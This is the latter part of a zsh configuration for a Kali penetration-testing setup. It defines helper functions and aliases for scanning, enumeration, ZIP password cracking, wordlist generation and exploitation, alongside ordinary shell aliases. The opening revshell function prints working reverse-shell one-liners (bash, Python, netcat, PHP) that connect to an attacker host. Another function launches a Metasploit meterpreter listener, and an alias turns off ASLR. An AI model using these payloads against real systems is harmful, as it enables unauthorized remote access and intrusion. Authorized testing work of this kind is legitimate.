    echo ""
    echo "[BASH]"
    echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
    echo ""
    echo "[PYTHON]"
    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    echo ""
    echo "[NETCAT]"
    echo "nc -e /bin/sh $lhost $lport"
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
    echo ""
    echo "[PHP]"
    echo "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    echo ""
    echo "[LISTENER]"
    echo "nc -lvnp $lport"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# ═══ METASPLOIT FAST LISTENER ═══
msflistener() {
    if [ -z "$1" ]; then
        local lport="4444"
    else
        local lport="$1"
    fi
    
    echo "[*] Starting Metasploit listener on port $lport..."
    msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT $lport; exploit"
}

# ═══ PATTERN CREATE ═══
pattern_create() {
    if [ -z "$1" ]; then
        echo "Usage: pattern_create <lenght>"
        return 1
    fi
    python3 -c "from pwn import *; print(cyclic($1))"
}

# ═══ OFFSET CALC ═══
pattern_offset() {
    if [ -z "$1" ]; then
        echo "Usage: pattern_offset <offset>"
        return 1
    fi
    python3 -c "from pwn import *; print(cyclic_find(b'$1'))"
}

# ═══ SUBDOMAIN ENUMERATION ═══
subdomains() {
    if [ -z "$1" ]; then
        echo "Usage: subdomains <domain>"
        echo "Enumerate subdomains with gobuster"
        return 1
    fi
    echo "[*] Enumerating subdomains for $1..."
    gobuster dns -d "$1" -w /usr/share/wordlists/dnsmap.txt -o "subdomains_$1_$(date +%Y%m%d_%H%M%S).txt"
}

# ═══ FAST WHOIS ═══
whoislookup() {
    if [ -z "$1" ]; then
        echo "Usage: whoislookup <domain/ip>"
        return 1
    fi
    whois "$1" | grep -E "(Organization|Country|Address|NetRange|CIDR)"
}

# ═══ COMPLETE DNS LOOKUP ═══
dnslookup() {
    if [ -z "$1" ]; then
        echo "Usage: dnslookup <domain>"
        return 1
    fi
    echo "[A Records]"
    dig +short A "$1"
    echo ""
    echo "[MX Records]"
    dig +short MX "$1"
    echo ""
    echo "[NS Records]"
    dig +short NS "$1"
    echo ""
    echo "[TXT Records]"
    dig +short TXT "$1"
}

# ═══ CRACK ZIP PASSWORD ═══
crackzip() {
    if [ -z "$1" ] || [ -z "$2" ]; then
        echo "Usage: crackzip <zipfile> <wordlist>"
        return 1
    fi
    echo "[*] Cracking $1 with wordlist $2..."
    fcrackzip -u -D -p "$2" "$1"
}

# ═══ GENERATE CUSTOM WORDLIST ═══
genwordlist() {
    if [ -z "$1" ]; then
        echo "Usage: genwordlist <base_word>"
        echo "Generate word variations"
        return 1
    fi
    echo "[*] Generating wordlist variations..."
    echo "$1" | sed 's/.*/\L&\n\u&\n\U&/' | \
    sed 's/$/1\n&2\n&3\n&123\n&2023\n&2024\n&!/'
}

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ ENVIRONMENT VARIABLES - Custom Environment Variables                   │
# └─────────────────────────────────────────────────────────────────────────┘

# Default editors
export EDITOR='vim'
export VISUAL='vim'
export PAGER='less'

# Less colors
export LESS='-R'
export LESSOPEN='|pygmentize -g %s 2>/dev/null'

# Custom paths
export PATH="$HOME/bin:$HOME/.local/bin:/usr/local/bin:$PATH"

# History timestamp format
export HISTTIMEFORMAT="%F %T "

# Fix for some applications
export QT_QPA_PLATFORMTHEME=qt5ct

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ BANNER - Cyber Style Welcome Message                                   │
# └─────────────────────────────────────────────────────────────────────────┘

# Uncomment to show banner on startup
show_banner() {
    clear
    echo -e "\e[32m"
    cat << "EOF"
    ██╗  ██╗ █████╗ ██╗     ██╗    ██╗   ██╗██╗  ██╗████████╗██████╗  █████╗ 
    ██║ ██╔╝██╔══██╗██║     ██║    ██║   ██║██║  ██║╚══██╔══╝██╔══██╗██╔══██╗
    █████╔╝ ███████║██║     ██║    ██║   ██║██║  ██║   ██║   ██████╔╝███████║
    ██╔═██╗ ██╔══██║██║     ██║    ██║   ██║██║  ██║   ██║   ██╔══██╗██╔══██║
    ██║  ██╗██║  ██║███████╗██║    ╚██████╔╝███████╔╝   ██║   ██║  ██║██║  ██║
    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═════╝ ╚══════╝    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝
EOF
    echo -e "\e[36m    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
    echo -e "\e[32m    🐉 PENETRATION TESTING TERMINAL\e[0m"
    echo -e "\e[36m    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
    echo -e "\e[33m    User: \e[36m$(whoami)\e[33m | Host: \e[36m$(hostname)\e[33m | IP: \e[36m$(hostname -I | awk '{print $1}')\e[0m"
    echo -e "\e[33m    Shell: \e[36mZsh $ZSH_VERSION\e[33m | Date: \e[36m$(date '+%d/%m/%Y %H:%M:%S')\e[0m"
    echo -e "\e[36m    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
    echo -e "\e[32m    💡 Type 'help' for custom commands or 'sysinfo' for system info\e[0m"
    echo -e "\e[36m    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
    echo ""
}

# Run banner on startup (comment if not wanted)
# show_banner

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ HELP COMMAND - Show available custom commands                          │
# └─────────────────────────────────────────────────────────────────────────┘

help() {
    echo -e "\e[32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
    echo -e "\e[36m KALI ULTRA CUSTOM COMMANDS\e[0m"
    echo -e "\e[32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
    echo ""
    echo -e "\e[33m[SCANNING & RECON]\e[0m"
    echo -e "  quickscan <target>      - Fast nmap with versioning"
    echo -e "  fullscan <target>       - Complete nmap all ports"
    echo -e "  vulnscan <target>       - Vulnerability scan"
    echo -e "  portscan <target>       - Fast common ports scan"
    echo -e "  subdomains <domain>     - Enumerate subdomains"
    echo -e "  dnslookup <domain>      - Complete DNS lookup"
    echo -e "  whoislookup <target>    - Fast WHOIS"
    echo ""
    echo -e "\e[33m[WEB TESTING]\e[0m"
    echo -e "  dirscan <url>           - Directory bruteforce"
    echo -e "  serve [port]            - Start HTTP server (default 8000)"
    echo ""
    echo -e "\e[33m[EXPLOITATION]\e[0m"
    echo -e "  revshell <ip> <port>    - Generate reverse shell payloads"
    echo -e "  msflistener [port]      - Start Metasploit listener"
    echo -e "  crackzip <file> <wlist> - Crack ZIP password"
    echo -e "  pattern_create <lenght> - Generate pattern string"
    echo -e "  pattern_offset <offset> - Calculate pattern offset"
    echo ""
    echo -e "\e[33m[UTILITIES]\e[0m"
    echo -e "  extract <file>          - Extract any archive"
    echo -e "  compress <out> <in>     - Compress file/directory"
    echo -e "  ff <pattern>            - Find files by name"
    echo -e "  fd <pattern>            - Find directory"
    echo -e "  mkcd <dir>              - Create directory and cd into it"
    echo -e "  backup <file>           - Backup with timestamp"
    echo -e "  hashfile <file>         - Calculate MD5/SHA1/SHA256"
    echo -e "  genpass [length]        - Generate random password"
    echo ""
    echo -e "\e[33m[ENCODING]\e[0m"
    echo -e "  b64encode <string>      - Base64 encode"
    echo -e "  b64decode <string>      - Base64 decode"
    echo -e "  urlencode <string>      - URL encoding"
    echo -e "  urldecode <string>      - URL decoding"
    echo ""
    echo -e "\e[33m[SYSTEM]\e[0m"
    echo -e "  sysinfo                 - System information"
    echo -e "  bigfiles [n]            - Top N largest files"
    echo -e "  killps <name>           - Kill processes by name"
    echo -e "  netmon                  - Monitor network traffic"
    echo -e "  checkport <host> <port> - Check open port"
    echo ""
    echo -e "\e[32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
}

help_full() {
    echo -e "\e[32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
    echo -e "\e[36m KALI ULTRA CUSTOM COMMANDS\e[0m"
    echo -e "\e[32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
    echo ""
    echo -e "\e[33m[SCANNING & RECON]\e[0m"
    echo -e "  quickscan <target>      - Fast nmap with versioning"
    echo -e "  fullscan <target>       - Complete nmap all ports"
    echo -e "  vulnscan <target>       - Vulnerability scan"
    echo -e "  portscan <target>       - Fast common ports scan"
    echo -e "  subdomains <domain>     - Enumerate subdomains"
    echo -e "  dnslookup <domain>      - Complete DNS lookup"
    echo -e "  whoislookup <target>    - Fast WHOIS"
    echo ""
    echo -e "\e[33m[WEB TESTING]\e[0m"
    echo -e "  dirscan <url>           - Directory bruteforce"
    echo -e "  serve [port]            - Start HTTP server (default 8000)"
    echo ""
    echo -e "\e[33m[EXPLOITATION]\e[0m"
    echo -e "  revshell <ip> <port>    - Generate reverse shell payloads"
    echo -e "  msflistener [port]      - Start Metasploit listener"
    echo -e "  crackzip <file> <wlist> - Crack ZIP password"
    echo -e "  pattern_create <lenght> - Generate pattern string"
    echo -e "  pattern_offset <offset> - Calculate pattern offset"
    echo ""
    echo -e "\e[33m[UTILITIES]\e[0m"
    echo -e "  extract <file>          - Extract any archive"
    echo -e "  compress <out> <in>     - Compress file/directory"
    echo -e "  ff <pattern>            - Find files by name"
    echo -e "  fd <pattern>            - Find directory"
    echo -e "  mkcd <dir>              - Create directory and cd into it"
    echo -e "  backup <file>           - Backup with timestamp"
    echo -e "  hashfile <file>         - Calculate MD5/SHA1/SHA256"
    echo -e "  genpass [length]        - Generate random password"
    echo ""
    echo -e "\e[33m[ENCODING]\e[0m"
    echo -e "  b64encode <string>      - Base64 encode"
    echo -e "  b64decode <string>      - Base64 decode"
    echo -e "  urlencode <string>      - URL encoding"
    echo -e "  urldecode <string>      - URL decoding"
    echo ""
    echo -e "\e[33m[SYSTEM]\e[0m"
    echo -e "  sysinfo                 - System information"
    echo -e "  bigfiles [n]            - Top N largest files"
    echo -e "  killps <name>           - Kill processes by name"
    echo -e "  netmon                  - Monitor network traffic"
    echo -e "  checkport <host> <port> - Check open port"
    echo ""
    echo -e "\e[32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"

    echo -e "\e[32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
    echo -e "\e[36m KALI ULTRA CUSTOM ALIASES\e[0m"
    echo -e "\e[32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"

    # ═══ FAST NAVIGATION ═══
    echo -e "\e[33m[FAST NAVIGATION]\e[0m"
    echo -n "alias ..='cd ..'"; echo
    echo -n "alias ...='cd ../..'"; echo
    echo -n "alias ....='cd ../../..'"; echo
    echo -n "alias .....='cd ../../../..'"; echo
    echo -n "alias -- -='cd -'   # Go to previous directory"; echo
    echo

    # ═══ LS VARIANTS ═══
    echo -e "\e[33m[LS VARIANT]\e[0m"
    echo -n "alias l='ls -lFh --color=auto'       # Long list"; echo
    echo -n "alias la='ls -lAFh --color=auto'     # All files"; echo
    echo -n "alias ll='ls -lh --color=auto'       # Long list"; echo
    echo -n "alias ls='ls --color=auto'           # Colors"; echo
    echo -n "alias lsa='ls -lah --color=auto'     # All with details"; echo
    echo -n "alias lt='ls -ltFh --color=auto'     # Sort by date"; echo
    echo -n "alias lS='ls -lSFh --color=auto'     # Sort by size"; echo
    echo -n "alias lr='ls -tRFh --color=auto'     # Recursive sorted"; echo
    echo -n "alias ldot='ls -ld .* --color=auto'  # Only dotfiles"; echo
    echo -n "alias tree='tree -C'                  # Tree with colors"; echo
    echo

    # ═══ ENHANCED GREP ═══
    echo -e "\e[33m[ENHACED GREP]\e[0m"
    echo -n "alias grep='grep --color=auto'"; echo
    echo -n "alias fgrep='fgrep --color=auto'"; echo
    echo -n "alias egrep='egrep --color=auto'"; echo
    echo -n "alias rgrep='grep -r --color=auto'"; echo
    echo -n "alias sgrep='grep -r -n -H -C 5 --exclude-dir={.git,.svn,CVS} --color=auto'"; echo
    echo

    # ═══ SYSTEM & PACKAGE MANAGEMENT ═══
    echo -e "\e[33m[SYSTEM & PACKAGE MANAGEMENT]\e[0m"
    echo -n "alias update='sudo apt update && sudo apt upgrade -y'"; echo
    echo -n "alias install='sudo apt install -y'"; echo
    echo -n "alias remove='sudo apt remove'"; echo
    echo -n "alias autoremove='sudo apt autoremove -y'"; echo
    echo -n "alias search='apt search'"; echo
    echo -n "alias show='apt show'"; echo
    echo -n "alias clean='sudo apt autoremove -y && sudo apt autoclean'"; echo
    echo -n "alias upgrade='sudo apt update && sudo apt full-upgrade -y'"; echo
    echo

    # ═══ DIRECTORY OPERATIONS ═══
    echo -e "\e[33m[DIRECTORY OPERATIONS]\e[0m"
    echo -n "alias md='mkdir -pv'"; echo
    echo -n "alias rd='rmdir'"; echo
    echo -n "alias mkdir='mkdir -pv'"; echo
    echo

    # ═══ FILE OPERATIONS ═══
    echo -e "\e[33m[FILE OPERATIONS]\e[0m"
    echo -n "alias cp='cp -iv'                    # Interactive copy"; echo
    echo -n "alias mv='mv -iv'                    # Interactive move"; echo
    echo -n "alias rm='rm -Iv --preserve-root'    # Safe removal"; echo
    echo -n "alias ln='ln -i'"; echo
    echo -n "alias chown='chown --preserve-root'"; echo
    echo -n "alias chmod='chmod --preserve-root'"; echo
    echo -n "alias chgrp='chgrp --preserve-root'"; echo
    echo

    # ═══ DISK USAGE ═══
    echo -e "\e[33m[DISK USAGE]\e[0m"
    echo -n "alias df='df -h'"; echo
    echo -n "alias du='du -ch'"; echo
    echo -n "alias du1='du -d 1 -h'"; echo
    echo -n "alias dus='du -sh'"; echo
    echo -n "alias free='free -h'"; echo
    echo

    # ═══ PROCESS & SYSTEM ═══
    echo -e "\e[33m[PROCESS & SYSTEM]\e[0m"
    echo -n "alias ps='ps auxf'"; echo
    echo -n "alias psg='ps aux | grep -v grep | grep -i -e VSZ -e'"; echo
    echo -n "alias top='htop'"; echo
    echo -n "alias topc='htop -s PERCENT_CPU'"; echo
    echo -n "alias topm='htop -s PERCENT_MEM'"; echo
    echo

    # ═══ NETWORK TOOLS ═══
    echo -e "\e[33m[NETWORK TOOLS]\e[0m"
    echo -n "alias ports='netstat -tulanp'"; echo
    echo -n "alias listening='lsof -i -P | grep LISTEN'"; echo
    echo -n "alias myip='curl -s ifconfig.me'"; echo
    echo -n "alias localip='ip addr show | grep inet'"; echo
    echo -n "alias ips='ip -c addr'"; echo
    echo -n "alias ping='ping -c 5'"; echo
    echo -n "alias fastping='ping -c 100 -i.2'"; echo
    echo -n "alias wget='wget -c'"; echo
    echo -n "alias speedtest='curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python3 -'"; echo
    echo

    # ═══ COLORED IFCONFIG (function) - indicato come alias/builtin ═══
    echo -e "\e[33m[COLORED COMMANDS]\e[0m"
    echo -n "ifconfig() { ... }  # colored ip/route display function (see config)"; echo
    echo

    # ═══ KALI SECURITY TOOLS ═══
    echo -e "\e[33m[KALI SECURITY TOOLS]\e[0m"
    echo -n "alias nmap='sudo nmap'"; echo
    echo -n "alias nmapquick='sudo nmap -sV -T4'"; echo
    echo -n "alias nmapfull='sudo nmap -sS -sV -O -A -p-'"; echo
    echo -n "alias nmapvuln='sudo nmap --script vuln'"; echo
    echo -n "alias metasploit='msfconsole -q'"; echo
    echo -n "alias msf='msfconsole -q'"; echo
    echo -n "alias msfupdate='sudo msfupdate'"; echo
    echo -n "alias wireshark='sudo wireshark'"; echo
    echo -n "alias airmon='sudo airmon-ng'"; echo
    echo -n "alias airodump='sudo airodump-ng'"; echo
    echo -n "alias burp='java -jar /usr/bin/burpsuite &'"; echo
    echo -n "alias sqlmap='sqlmap --batch --random-agent'"; echo
    echo -n "alias hydra='hydra -V'"; echo
    echo -n "alias john='john --format=raw-md5'"; echo
    echo -n "alias hashcat='hashcat -m 0'"; echo
    echo -n "alias gobuster='gobuster -k'"; echo
    echo -n "alias nikto='nikto -h'"; echo
    echo

    # ═══ GIT ENHANCED ═══
    echo -e "\e[33m[GIT ENHACED]\e[0m"
    echo -n "alias g='git'"; echo
    echo -n "alias gs='git status'"; echo
    echo -n "alias ga='git add'"; echo
    echo -n "alias gaa='git add --all'"; echo
    echo -n "alias gc='git commit -m'"; echo
    echo -n "alias gca='git commit -am'"; echo
    echo -n "alias gp='git push'"; echo
    echo -n "alias gpl='git pull'"; echo
    echo -n "alias gd='git diff'"; echo
    echo -n "alias gdc='git diff --cached'"; echo
    echo -n "alias gl='git log --oneline --graph --decorate --all'"; echo
    echo -n "alias gll='git log --graph --pretty=format:\"%C(yellow)%h%Creset %C(cyan)%an%Creset %s %C(green)(%cr)%Creset\" --abbrev-commit'"; echo
    echo -n "alias gb='git branch'"; echo
    echo -n "alias gco='git checkout'"; echo
    echo -n "alias gcb='git checkout -b'"; echo
    echo -n "alias gm='git merge'"; echo
    echo -n "alias gr='git remote -v'"; echo
    echo -n "alias gclone='git clone'"; echo
    echo

    # ═══ DOCKER ═══
    echo -e "\e[33m[DOCKER]\e[0m"
    echo -n "alias d='docker'"; echo
    echo -n "alias dps='docker ps'"; echo
    echo -n "alias dpsa='docker ps -a'"; echo
    echo -n "alias dimg='docker images'"; echo
    echo -n "alias drm='docker rm'"; echo
    echo -n "alias drmi='docker rmi'"; echo
    echo -n "alias dstop='docker stop'"; echo
    echo -n "alias dstart='docker start'"; echo
    echo -n "alias dex='docker exec -it'"; echo
    echo -n "alias dlogs='docker logs -f'"; echo
    echo -n "alias dprune='docker system prune -af'"; echo
    echo

    # ═══ PYTHON ═══
    echo -e "\e[33m[PYTHON]\e[0m"
    echo -n "alias py='python3'"; echo
    echo -n "alias python='python3'"; echo
    echo -n "alias pip='pip3'"; echo
    echo -n "alias venv='python3 -m venv'"; echo
    echo -n "alias activate='source venv/bin/activate'"; echo
    echo

    # ═══ TEXT EDITORS ═══
    echo -e "\e[33m[TEXT EDITORS]\e[0m"
    echo -n "alias v='vim'"; echo
    echo -n "alias vi='vim'"; echo
    echo -n "alias nano='nano -c'"; echo
    echo -n "alias svi='sudo vim'"; echo
    echo

    # ═══ HISTORY ═══
    echo -e "\e[33m[HISTORY]\e[0m"
    echo -n "alias h='history'"; echo
    echo -n "alias hg='history | grep'"; echo
    echo -n "alias histg='history | grep'"; echo
    echo

    # ═══ SERVICES ═══
    echo -e "\e[33m[SERVICES]\e[0m"
    echo -n "alias sstart='sudo systemctl start'"; echo
    echo -n "alias sstop='sudo systemctl stop'"; echo
    echo -n "alias srestart='sudo systemctl restart'"; echo
    echo -n "alias sstatus='sudo systemctl status'"; echo
    echo -n "alias senable='sudo systemctl enable'"; echo
    echo -n "alias sdisable='sudo systemctl disable'"; echo
    echo

    # ═══ SAFETY ═══
    echo -e "\e[33m[SAFETY]\e[0m"
    echo -n "alias please='sudo'"; echo
    echo -n "alias fuck='sudo $(fc -ln -1)'       # Repeat last command with sudo"; echo
    echo -n "alias pls='sudo'"; echo
    echo

    # ═══ MISC UTILS ═══
    echo -e "\e[33m[MISC UTILS]\e[0m"
    echo -n "alias c='clear'"; echo
    echo -n "alias cls='clear'"; echo
    echo -n "alias e='exit'"; echo
    echo -n "alias path='echo -e ${PATH//:/\\n}'"; echo
    echo -n "alias now='date +\"%d-%m-%Y %T\"'"; echo
    echo -n "alias nowdate='date +\"%d-%m-%Y\"'"; echo
    echo -n "alias week='date +%V'"; echo
    echo -n "alias timer='echo \"Timer started. Stop with Ctrl-D.\" && date && time cat && date'"; echo
    echo -n "alias reload='source ~/.zshrc'"; echo
    echo -n "alias zshrc='${EDITOR:-vim} ~/.zshrc'"; echo
    echo -n "alias aslr_off='echo 0 | sudo tee /proc/sys/kernel/randomize_va_space'"; echo
    echo -n "alias aslr_on='echo 2 | sudo tee /proc/sys/kernel/randomize_va_space'"; echo
    echo

    echo -e "\e[32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
}


# ┌─────────────────────────────────────────────────────────────────────────┐
# │ FINAL MESSAGE                                                           │
# └─────────────────────────────────────────────────────────────────────────┘

# Final message when configuration is loaded
echo -e "\e[32m✓ Kali Ultra ZSH configuration loaded successfully\e[0m"
echo -e "\e[36m━ Type '\e[33mhelp\e[36m' or '\e[33mhelp_full\e[36m' for custom commands\e[0m"
